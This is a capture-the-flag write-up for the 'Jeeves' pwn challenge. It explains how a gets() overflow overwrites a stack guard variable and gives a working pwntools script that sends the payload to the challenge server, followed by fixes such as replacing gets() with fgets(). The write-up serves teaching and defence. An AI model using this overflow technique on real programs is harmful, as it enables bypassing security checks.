## Overview

**Jeeves** is an Easy Pwn challenge. The program greets you, asks for your name, and — if a guard variable on the stack happens to hold a specific magic value — opens `flag.txt` and hands it to you as a "small gift". The name is read with [`gets()`](https://cwe.mitre.org/data/definitions/242.html), which never checks how much it writes, so we can [overflow the buffer](https://cwe.mitre.org/data/definitions/787.html) far enough to overwrite that guard with the value the binary wants. No return address is harmed in the making of this exploit.

## The technique

This is the simplest flavour of *ret2win*: **ret2win without the ret**. Many beginner pwn binaries leave a built-in "print the flag" path behind a single comparison. Here, decompiling `main` shows it:

```c
int guard = 0xdeadc0d3;       // [rbp-0x4]
char name[64];                // [rbp-0x40]
printf("Hello, good sir!\nMay I have your name? ");
gets(name);                   // unbounded read — classic overflow
printf("Hello %s, hope you have a good day!\n", name);
if (guard == 0x1337bab3) {    // magic-value gate
    char *buf = malloc(0x100);
    int fd = open("flag.txt", O_RDONLY);
    read(fd, buf, 0x100);
    printf("Here's a small gift: %s\n", buf);   // flag printed for us
}
```

The corresponding disassembly (`objdump -d -M intel jeeves`) confirms the layout:

```
mov DWORD PTR [rbp-0x4], 0xdeadc0d3   ; guard init
lea rax,[rbp-0x40] ; call gets        ; read name into 64-byte buffer
cmp DWORD PTR [rbp-0x4], 0x1337bab3   ; the gate
jne <skip>
```

The buffer `name` starts at `rbp-0x40` and the guard lives at `rbp-0x4`, so there are `0x40 - 0x4 = 60` bytes between the start of our input and the guard. Writing 60 bytes of filler followed by the little-endian magic value `0x1337bab3` lands exactly on the guard and flips the gate. The four magic bytes `b3 ba 37 13` contain no `0x00` or `0x0a`, so `gets()` — which only stops at a newline — reads the whole thing on a single line.

A nice detail: a `checksec` on this binary shows Full RELRO, NX, PIE, and *no canary found* — but none of that matters. We never touch a saved return address or any pointer, just one local integer. Even a stack canary would not catch this, because the canary sits *above* the guard, between the locals and the saved return address.

## Solution

The whole exploit is a single line of payload. Here is the `solve.py` used against the live container:

```python
#!/usr/bin/env python3
from pwn import *
import sys, re
context.update(arch='amd64', os='linux')

io = remote(sys.argv[1], int(sys.argv[2]))
payload = b'A'*60 + p32(0x1337bab3)   # 60B filler + magic guard value
io.sendline(payload)
data = io.recvall(timeout=5).decode(errors='replace')
print(data)
m = re.search(r'HTB\{[^}]+\}', data)
if m:
    print('[+] FLAG:', m.group(0))
```

Run it against the spawned instance:

```bash
python3 solve.py <docker_ip> <port>
```

The server opens its real `flag.txt` and prints it back:

```
Pleased to make your acquaintance. Here's a small gift: HTB{...}
```

## Why it worked

The author shipped a debug/gift code path that prints the flag, gated only by an integer stored on the stack right next to an input buffer that is filled by the unbounded `gets()`. Because the guard is closer to the buffer than the saved return address is, an [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) reaches and rewrites the guard long before it would ever reach control-flow-sensitive data. Winning becomes a matter of setting one value, not hijacking execution.

## Fix / defense

- **Never use `gets()`.** Replace it with `fgets(name, sizeof name, stdin)`, which bounds the read so it can never reach the guard. `gets()` is so dangerous it was removed from the C11 standard.
- **Don't gate a flag/privileged branch on a stack value an overflow can reach** — and ideally don't ship such a path in the release build at all. If a gate must exist, base it on a value that isn't adjacent to an overflowable buffer.
- A [stack canary](https://cwe.mitre.org/data/definitions/121.html) protects the *return address*, not in-frame variables below it, so it would not stop this — bounds-checking the input is the real fix.
